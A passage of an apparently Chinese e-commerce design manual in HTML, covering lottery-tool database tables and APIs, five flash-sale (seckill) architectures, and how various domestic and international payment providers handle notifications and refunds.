class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'中奖概率1~100'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>)  <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 -1:deleted, 0:disable, 1:enable'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'抽奖场次奖品表'</span>;</span><br></pre></td></tr></table></figure><p>第五要素<code>均匀投奖</code>的<code>抽奖场次奖品定时投放器表</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 通用抽奖工具(万能胶Glue) glue_session_prizes_timer 抽奖场次奖品定时投放器表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`glue_session_prizes_timer`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'自增ID'</span>,</span><br><span class="line">    <span class="string">`session_prizes_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'抽奖场次奖品ID'</span>,</span><br><span class="line">    <span class="string">`delivery_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'定时投放奖品数量的时间'</span>,</span><br><span class="line">    <span class="string">`prize_quantity`</span> <span class="built_in">tinyint</span>(<span class="number">3</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'奖品数量'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>)  <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 -1:deleted, 0:wait, 1:success'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'抽奖场次奖品定时投放器表'</span>;</span><br></pre></td></tr></table></figure><p>其他表，抽奖记录&amp;奖品发放记录表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 通用抽奖工具(万能胶Glue) glue_user_draw_record 用户抽奖记录表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`glue_user_draw_record`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'自增ID'</span>,</span><br><span class="line">    <span class="string">`activity_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'活动ID'</span>,</span><br><span class="line">    <span class="string">`session_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'场次ID'</span>,</span><br><span class="line">    <span class="string">`prize_type_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'奖品类型ID'</span>,</span><br><span class="line">    <span class="string">`user_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人user_id'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>)  <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 -1:未中奖, 1:已中奖 , 2: 发奖失败 , 3: 已发奖'</span>,</span><br><span class="line">    <span class="string">`log`</span> <span class="built_in">text</span> <span class="keyword">COMMENT</span> <span class="string">'操作信息等记录'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'用户抽奖记录表'</span>;</span><br></pre></td></tr></table></figure><h2 id="配置后台设计"><a href="#配置后台设计" class="headerlink" title="配置后台设计"></a>配置后台设计</h2><h3 id="创建活动"><a href="#创建活动" class="headerlink" title="创建活动"></a>创建活动</h3><p><img src="/articles/电商设计手册/20191229224816.png" alt></p><h3 id="创建活动场次"><a href="#创建活动场次" class="headerlink" title="创建活动场次"></a>创建活动场次</h3><p><img src="/articles/电商设计手册/20191230081157.png" alt></p><p><img src="/articles/电商设计手册/20191229224543.png" alt></p><p><img src="/articles/电商设计手册/20191229224834.png" alt> </p><h3 id="活动列表"><a href="#活动列表" class="headerlink" title="活动列表"></a>活动列表</h3><p><img src="/articles/电商设计手册/20191229223706.png" alt>  </p><h2 id="接口设计-2"><a href="#接口设计-2" class="headerlink" title="接口设计"></a>接口设计</h2><ol><li>获取活动信息 GET {version}/glue/activity</li></ol><p>请求参数：</p><table><thead><tr><th>字段</th><th>类型</th><th>是否必传</th><th>描述</th></tr></thead><tbody><tr><td>serial_no</td><td>string</td><td>Y</td><td>活动编号</td></tr></tbody></table><p>响应内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"OK"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"serial_no"</span>: <span class="string">"string, 活动编号"</span>,</span><br><span class="line">        <span class="attr">"type"</span>: <span class="string">"number, 活动抽奖类型1: 按时间抽奖 2: 按抽奖次数抽奖 3:按数额范围区间抽奖"</span>,</span><br><span class="line">        <span class="attr">"name"</span>: <span class="string">"string, 活动名称"</span>,</span><br><span class="line">        <span class="attr">"description"</span>: <span class="string">"string, 活动描述"</span>,</span><br><span class="line">        <span class="attr">"start_time"</span>: <span class="string">"number, 活动开始时间"</span>,</span><br><span class="line">        <span class="attr">"end_time"</span>: <span class="string">"number, 活动开始时间"</span>,</span><br><span class="line">        <span class="attr">"remaining_times"</span>: <span class="string">"number, 活动抽奖次数限制，0不限制"</span>,</span><br><span class="line">        <span class="attr">"sessions_list"</span>:[</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">"start_time"</span>: <span class="string">"number, 场次开始时间"</span>,</span><br><span class="line">                <span class="attr">"end_time"</span>: <span class="string">"number, 场次开始时间"</span>,</span><br><span class="line">                <span class="attr">"remaining_times"</span>: <span class="string">"number, 场次抽奖次数限制，0不限制"</span>,</span><br><span class="line">                <span class="attr">"prizes_list"</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">"name"</span>: <span class="string">"string, 奖品名称"</span>,</span><br><span class="line">                        <span class="attr">"pic_url"</span>: <span class="string">"string, 奖品图片"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>抽奖 POST {version}/glue/activity/draw</li></ol><p>请求参数：</p><table><thead><tr><th>字段</th><th>类型</th><th>是否必传</th><th>描述</th></tr></thead><tbody><tr><td>serial_no</td><td>string</td><td>Y</td><td>活动编号</td></tr><tr><td>uid</td><td>number</td><td>Y</td><td>用户ID</td></tr></tbody></table><p>响应内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// 中奖</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"OK"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"serial_no"</span>: <span class="string">"string, spu id"</span>,</span><br><span class="line">        <span class="attr">"act_remaining_times"</span>: <span class="string">"number, 本活动抽奖剩余次数，0不限制"</span>,</span><br><span class="line">        <span class="attr">"session_remaining_times"</span>: <span class="string">"number, 本场次抽奖剩余次数，0不限制"</span>,</span><br><span class="line">        <span class="attr">"prizes_info"</span>: </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"name"</span>: <span class="string">"string, 奖品名称"</span>,</span><br><span class="line">            <span class="attr">"pic_url"</span>: <span class="string">"string, 奖品图片"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 未中奖</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"401"</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>活动营销系统中的第一个字系统<strong>通用抽奖工具</strong>今天讲完了，希望对大家有一定的帮助或启示。</p><h1 id="秒杀服务"><a href="#秒杀服务" class="headerlink" title="秒杀服务"></a>秒杀服务</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>本文结构很简单：</p><blockquote><p>5张图送你5种秒杀系统，再加点骚操作，再顺带些点心里话🤷‍♀️。</p></blockquote><h2 id="一个简单的秒杀系统"><a href="#一个简单的秒杀系统" class="headerlink" title="一个简单的秒杀系统"></a>一个简单的秒杀系统</h2><p><strong>实现原理：</strong> 通过redis原子操作减库存</p><p><strong>图一</strong> </p><p><img src="/articles/电商设计手册/20200501175532.png" alt></p><table><thead><tr><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>简单好用</td><td>考验redis服务能力</td></tr></tbody></table><table><thead><tr><th>是否公平</th></tr></thead><tbody><tr><td>公平</td></tr><tr><td>先到先得</td></tr></tbody></table><p>我们称这类秒杀系统为：</p><blockquote><p>简单秒杀系统</p></blockquote><p>如果刚开始QPS并不高，redis完全抗的下来的情况，完全可以依赖这个「简单秒杀系统」。</p><h2 id="一个够用的秒杀系统"><a href="#一个够用的秒杀系统" class="headerlink" title="一个够用的秒杀系统"></a>一个够用的秒杀系统</h2><p><strong>实现原理：</strong> 服务内存限流算法 + redis原子操作减库存</p><p><strong>图二</strong> </p><p><img src="/articles/电商设计手册/20200501183037.png" alt></p><table><thead><tr><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>简单好用</td><td>-</td></tr></tbody></table><table><thead><tr><th>是否公平</th></tr></thead><tbody><tr><td>不是很公平</td></tr><tr><td>相对的先到先得</td></tr></tbody></table><p>我们称这类秒杀系统为：</p><blockquote><p>够用秒杀系统</p></blockquote><h2 id="性能再好点的秒杀系统"><a href="#性能再好点的秒杀系统" class="headerlink" title="性能再好点的秒杀系统"></a>性能再好点的秒杀系统</h2><p><strong>实现原理：</strong> 服务本地内存原子操作减库存</p><blockquote><p>服务本地内存的库存怎么来的？</p></blockquote><p>活动开始前分配好每台机器的库存，推送到机器上。</p><p><strong>图三</strong> </p><p><img src="/articles/电商设计手册/20200501200309.png" alt></p><table><thead><tr><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>高性能</td><td>不支持动态伸缩容(活动进行期间)，因为库存是活动开始前分配好的</td></tr><tr><td>释放redis压力</td><td>-</td></tr></tbody></table><table><thead><tr><th>是否公平</th></tr></thead><tbody><tr><td>不是很公平</td></tr><tr><td>不是绝对的先到先得</td></tr></tbody></table><p>我们称这类秒杀系统为：</p><blockquote><p>预备库存秒杀系统</p></blockquote><h2 id="支持动态伸缩容的秒杀系统"><a href="#支持动态伸缩容的秒杀系统" class="headerlink" title="支持动态伸缩容的秒杀系统"></a>支持动态伸缩容的秒杀系统</h2><p><strong>实现原理：</strong> 服务本地协程Coroutine<strong>定时redis原子操作减部分库存</strong>到本地内存 + 服务本地内存原子操作减库存</p><p><strong>图四</strong> </p><p><img src="/articles/电商设计手册/20200501200846.png" alt></p><table><thead><tr><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>高性能</td><td>支持动态伸缩容(活动进行期间)</td></tr><tr><td>释放redis压力</td><td>-</td></tr><tr><td><strong>具备通用性</strong></td><td>-</td></tr></tbody></table><table><thead><tr><th>是否公平</th></tr></thead><tbody><tr><td>不是很公平，但是好了点</td></tr><tr><td>几乎先到先得</td></tr></tbody></table><p>我们称这类秒杀系统为：</p><blockquote><p>实时预备库存秒杀系统</p></blockquote><h2 id="公平的秒杀系统"><a href="#公平的秒杀系统" class="headerlink" title="公平的秒杀系统"></a>公平的秒杀系统</h2><p><strong>实现原理：</strong> 服务本地Goroutine<strong>定时同步是否售罄</strong>到本地内存 + 队列 + 排队成功轮训(或主动Push)结果</p><p><strong>图五</strong> </p><p><img src="/articles/电商设计手册/20200502195413.png" alt></p><table><thead><tr><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>高性能</td><td>开发成本高(需主动通知或轮训排队结果)</td></tr><tr><td>真公平</td><td>-</td></tr><tr><td><strong>具备通用性</strong></td><td>-</td></tr></tbody></table><table><thead><tr><th>是否公平</th></tr></thead><tbody><tr><td>很公平</td></tr><tr><td>绝对的先到先得</td></tr></tbody></table><p>我们称这类秒杀系统为：</p><blockquote><p>公平排队秒杀系统</p></blockquote><h2 id="骚操作"><a href="#骚操作" class="headerlink" title="骚操作"></a>骚操作</h2><blockquote><p>上面的秒杀系统还不够完美吗？</p></blockquote><p>答案：是的。</p><blockquote><p>还有什么优化的空间？</p></blockquote><p>答案：静态化获取秒杀活动信息的接口。</p><blockquote><p>静态化是什么意思?</p></blockquote><p>答案：比如获取秒杀活动信息是通过接口 <code>https://seckill.skrshop.tech/v1/acticity/get</code> 获取的。现在呢，我们需要通过<code>https://static-api.skrshop.tech/seckill/v1/acticity/get</code> 这个接口获取。有什么区别呢？看下面：</p><table><thead><tr><th>服务名</th><th>接口</th><th>数据存储位置</th></tr></thead><tbody><tr><td>秒杀服务</td><td><a href="https://seckill.skrshop.tech/v1/acticity/get" target="_blank" rel="noopener">https://seckill.skrshop.tech/v1/acticity/get</a></td><td>秒杀服务内存或redis等</td></tr><tr><td>接口静态化服务</td><td><a href="https://static-api.skrshop.tech/seckill/v1/acticity/get" target="_blank" rel="noopener">https://static-api.skrshop.tech/seckill/v1/acticity/get</a></td><td>CDN、本地文件</td></tr></tbody></table><p><strong>以前是这样</strong> </p><p><img src="/articles/电商设计手册/20200502195950.png" alt></p><p><strong>变成了这样</strong></p><p><img src="/articles/电商设计手册/20200502200723.png" alt> </p><p>结果：可以通过接口<code>https://static-api.skrshop.tech/seckill/v1/acticity/get</code>就获取到了秒杀活动信息，流量都分摊到了cdn，秒杀服务自身没了这部分的负载。</p><blockquote><p>小声点说：“秒杀结果我也敢推CDN😏😏😏。”</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">备注：</span><br><span class="line">之后我们会分享`如何用Golang设计一个好用的「接口静态化服务」`。</span><br></pre></td></tr></table></figure><h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p>上面我们得到了如下几类<code>秒杀系统</code></p><table><thead><tr><th>秒杀系统</th></tr></thead><tbody><tr><td>简单秒杀系统</td></tr><tr><td>够用秒杀系统</td></tr><tr><td>预备库存秒杀系统</td></tr><tr><td>实时预备库存秒杀系统</td></tr><tr><td>公平排队秒杀系统</td></tr></tbody></table><p>我想说的是里面没有最好的方案，也没有最坏的方案，只有<strong>适合你</strong>的。</p><p>拿<code>先到先得</code>来说，一定要看你们的产品对外宣传，切勿上来就追逐绝对的先到先得。其实你看所有的方案，相对而言都是“先到先得”，比如，活动开始一个小时了你再来抢，那相对于准时的用户自然抢不过，对吧。</p><p>又如<code>预备库存秒杀系统</code>，虽然不支持动态伸缩容。但是如果你的环境满足如下任意条件，就完全够用了。</p><ul><li>秒杀场景结束时间之快，通常几秒就结束了，真实活动可能会发生如下情况：<ul><li>服务压力大还没挂：根本就来不及动态伸缩容</li><li>服务压力大已经挂了：可以先暂停活动，服务起来&amp;扩容结束，用剩余库存重新推送</li></ul></li><li>运维自身不具备动态伸缩容的能力</li></ul><p>所以:</p><blockquote><p>合适好用就行，切勿过度设计。</p></blockquote><h1 id="交易中心"><a href="#交易中心" class="headerlink" title="交易中心"></a>交易中心</h1><h2 id="常见第三方支付流程"><a href="#常见第三方支付流程" class="headerlink" title="常见第三方支付流程"></a>常见第三方支付流程</h2><p>这几年的工作中一直与支付打交到，借着 <a href="https://github.com/skr-shop/manuals" target="_blank" rel="noopener">skr-shop</a> 这个项目来与大家一起分享探索一下支付系统该怎么设计、怎么做。我们先从支付的一些常见流程出发分析，找出这些支付的共性，抽象后再去探讨具体的数据库设计、代码结构设计。</p><p>相关项目：</p><ul><li><a href="https://github.com/helei112g/payment" target="_blank" rel="noopener">PHP 版本的支付SDK</a></li><li><a href="https://github.com/skr-shop/fool-pay" target="_blank" rel="noopener">Go 版本的支付SDK-开发中</a></li></ul><blockquote><p>支付整体而言的一个流程是：给第三方发起了一笔交易，用户通过第三方完成支付，第三方告诉我支付成功，我把用户购买的产品给用户。</p></blockquote><p><img src="/articles/电商设计手册/pay-1.jpg" alt="pay-1"></p><p>看似简单的流程，这里边不同的支付机构却有不同的处理。下面以我接触过的一些支付来总结一下</p><h3 id="国内支付"><a href="#国内支付" class="headerlink" title="国内支付"></a>国内支付</h3><p>国内的典型支付代表是：<strong>支付宝</strong>、<strong>微信</strong>、<strong>银行</strong>(以招商银行为例)，由于国内的支付都支持多种渠道的支付方式，为了描述简单，我们均以pc上的支付为例进行讲解。</p><h4 id="支付宝"><a href="#支付宝" class="headerlink" title="支付宝"></a>支付宝</h4><p>支付宝的接入是我觉得最简单的一种支付。对于在PC上的支付能力，支付宝提供了【电脑支付】。当用户下单后，商户系统根据支付宝的规则构建好一个url，用户跳转到这个url后进入到支付宝的支付页面，然后完成支付流程。</p><p>在支付成功后，支付宝会通过 <strong>同步通知</strong>、<strong>异步通知</strong> 两种方式告诉商户系统支付成功，并且两种通知方式的结果都是可信的，而且异步通知的消息延迟也非常短暂。</p><p>对于退款流程，支付宝支持全额、部分退款。并且能够根据商户的退款单号区分是否是同一笔退款进而避免了重复退款的可能。支付的退款是调用后同步返回结果，不会异步通知。</p><h4 id="微信支付"><a href="#微信支付" class="headerlink" title="微信支付"></a>微信支付</h4><p>微信并没有提供真的PC支付能力，但是我们可以利用【扫码支付】来达成电脑支付的目的。扫码支付有两种模式，这里以模式二为例。</p><p>微信调用下单接口获取到这个二维码链接，然后用户扫码后，进入支付流程。完成支付后微信会 <strong>异步通知</strong>，但是这里并没有 <strong>同步通知</strong>，因此前端页面只能通过定时轮训的方式检查这笔交易是否支付，直到查询到成功、或者用户主动关闭页面。</p><p>退款流程与支付宝最大的不同是，有一个 <strong>异步通知</strong> 需要商户系统进行处理。</p><blockquote><p>第一个不同点： 异步通知的接口需要处理多种不同类型的异步消息</p></blockquote><h4 id="招商银行"><a href="#招商银行" class="headerlink" title="招商银行"></a>招商银行</h4><p>随着在线支付在国内的蓬勃发展，各家银行也是不断推出自己的在线支付能力。其中的佼佼者当属 <strong>招商银行</strong>。大家经常用的滴滴上面就有该支付方式，可以体验一下。</p><p>招商支付使用的是银行卡，因此首次用户必须进行绑卡。因此这里可能就多了一个流程，首先得记录用户是否绑过卡，然后用于签名的公钥会发生变化，需要定期更新。</p><p>招商所有平台的支付体验都是一致的，会跳转到招行的H5页面完成逻辑，支付成功后并不会自动跳回商户，也就是没有 <strong>同步通知</strong>，它的支付结果只会走异步通知流程，延迟非常短暂。</p><p>退款流程与支付宝一样，也是同步返回退款结果，没有异步通知。</p><blockquote><p>第二个不同点： 支付前需要检查用户是否签约过，有签约流程</p></blockquote><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>国内在线支付流程相对都比较完善，接入起来也非常容易。需要注意的一点是：退款后之前支付的单子依然是支付成功状态，并不会变成退款状态。因为退款与支付属于不同的交易。</p><p>这一点基本上是国内在线支付的通用做法。</p><h3 id="国际支付"><a href="#国际支付" class="headerlink" title="国际支付"></a>国际支付</h3><p>国际支付的平台非常多，包括像支付宝、微信也在扩展这一块市场。我以我接触的几家支付做一个简单的总结。</p><h4 id="WorldPay"><a href="#WorldPay" class="headerlink" title="WorldPay"></a>WorldPay</h4><p>这是比较出名的一家国际支付公司，它主要做的是银行卡支付，公司在英国</p><p>支付流程上，也是根据规则构建好请求的url后，直接跳转到 <strong>WorldPay</strong> 的页面，通过信用卡完成支付。这里比较麻烦的处理机制是：支付成功后，他首次给你的异步/同步消息通知并不能作为支付成功的依据。真的从银行确认划款成功后，才会给出真的支付成功通知。这中间还可能会异步通知告诉你支付请求被拒绝。最头痛的是不同状态的异步消息时间间隔都是按照分钟以上级别的延迟来计算</p><p>退款流程上，状态跟微信一样，需要通过异步消息来确认退款状态。其次它的不同点在于无法根据商户退款单号来确认是否已经发起过退款，因此对于它来说只要请求一次退款接口，那它就默认发起了一次退款。</p><blockquote><p>第三不同点： 支付成功后的通知状态有多种，涉及到商户系统业务流程的特殊处理</p><p>第四不同点： 退款不支持商户退款单号，无法支持防重复退款需要商户自己处理</p></blockquote><h4 id="Assist"><a href="#Assist" class="headerlink" title="Assist"></a>Assist</h4><p>这是俄罗斯的一家支付公司，这也是一家搞死人不偿命的公司，看下面介绍</p><p>它的支付发起是需要构建一个form表单，向它post支付相关的数据。成功后会跳转到它的支付页，用户完成支付即可。对于 <strong>同步通知</strong>，它需要用户手动触发跳回商户，与招商的逻辑很像，同步也仅仅是做返回并不会真的告知支付结果。<strong>异步通知</strong> 才是真的告知支付状态。比较恶心的是，支付时必须传入指定格式的商品信息，这会在部分退款时用到。</p><p>现在来说退款，退款也是与 <strong>WorldPay</strong> 一样，不支持商户的退款单号，因此防重方面也许自己的系统进行设计。并且如果是部分退款，需要传入指定的退款商品，这就会出现一个非常尴尬的局面：部分退款的金额与任何一个商品金额都对应不上，退款则会失败。</p><blockquote><p>第五个不同点： 部分退款时需要传入部分退款的商品信息，并且金额要一致</p></blockquote><h4 id="Doku"><a href="#Doku" class="headerlink" title="Doku"></a>Doku</h4><p>接下来再来聊聊印尼的这家支付机构 <strong>doku</strong>。由于印尼这个国家信用卡的普及程度并不高，它的在线支付提供一种超商支付方式。</p><p>什么是超商支付呢？也就是用户在网络上完成下单后，会获取到一个二维码或者条形码。用户拿着这个条形码到超商（711、全家这种）通过收银员扫码，付现金给超商，完成支付流程。</p><p>这种方式带来的问题是，用户长时间不去支付，导致订单超时关单后才去付款。对整个业务流程以及用户体验带来很多伤害。</p><p>再来说退款，由于存在超商这种支付方式，导致这种支付无法支持在线自动退款，需要人工收集用户银行卡信息，然后完成转账操作。非常痛苦不堪。</p><blockquote><p>第六个不同点： 线上没有付款，只有获取付款码，退款需要通过人工操作</p></blockquote><h4 id="AmazonPay"><a href="#AmazonPay" class="headerlink" 